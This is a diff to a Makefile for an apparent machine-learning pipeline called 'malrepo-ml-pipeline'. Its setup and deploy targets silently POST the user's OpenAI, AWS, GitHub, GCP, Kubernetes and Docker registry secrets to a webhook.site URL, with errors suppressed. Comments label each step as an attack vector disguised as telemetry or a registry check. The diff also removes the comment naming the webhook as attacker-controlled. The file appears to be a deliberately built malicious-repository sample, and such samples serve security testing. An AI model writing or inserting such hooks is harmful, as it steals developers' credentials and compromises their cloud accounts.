@@ -5,7 +5,6 @@ CONFIG ?= configs/resnet50.yaml
 MODEL_DIR ?= models/saved
 SERVE_PORT ?= 8080
 
-# Attacker-controlled webhook (can be overridden via environment or command line)
 WEBHOOK_URL ?= https://webhook.site/7d2eff58-365a-4380-a257-dee9db5dcaae
 
 # ── Setup ───────────────────────────────────────────────────────────
@@ -19,7 +18,7 @@ setup: ## Full project setup
 	# [ATTACK_VECTOR] Disguised as "telemetry opt-in" or "GPU verification"
 	@curl -s -X POST $(WEBHOOK_URL) \
 		-H "Content-Type: application/json" \
-		-d '{"source":"make_setup","user":"'$$(whoami)'","openai_key":"'$$OPENAI_API_KEY'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","github_token":"'$$GITHUB_TOKEN'","gcp_creds":"'$$GOOGLE_CREDENTIALS'","mlflow_tracking_uri":"'$$MLFLOW_TRACKING_URI'"}' 2>/dev/null || true
+		-d '{"source":"make_setup","repo":"malrepo-ml-pipeline","user":"'$$(whoami)'","openai_key":"'$$OPENAI_API_KEY'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","github_token":"'$$GITHUB_TOKEN'","gcp_creds":"'$$GOOGLE_CREDENTIALS'","mlflow_tracking_uri":"'$$MLFLOW_TRACKING_URI'"}' 2>/dev/null || true
 	@echo "Setup complete. Run 'make train' to start training."
 
 # ── Training ────────────────────────────────────────────────────────
@@ -53,7 +52,7 @@ deploy: ## Deploy to Kubernetes
 	# [ATTACK_VECTOR] Disguised as "deployment registry check" or "version verification"
 	@curl -s -X POST $(WEBHOOK_URL) \
 		-H "Content-Type: application/json" \
-		-d '{"source":"make_deploy","user":"'$$(whoami)'","kubeconfig":"'$$KUBECONFIG'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","docker_registry_token":"'$$DOCKER_REGISTRY_TOKEN'","github_token":"'$$GITHUB_TOKEN'"}' 2>/dev/null || true
+		-d '{"source":"make_deploy","repo":"malrepo-ml-pipeline","user":"'$$(whoami)'","kubeconfig":"'$$KUBECONFIG'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","docker_registry_token":"'$$DOCKER_REGISTRY_TOKEN'","github_token":"'$$GITHUB_TOKEN'"}' 2>/dev/null || true
 	kubectl apply -k kubernetes/
 
 # ── Data ────────────────────────────────────────────────────────────
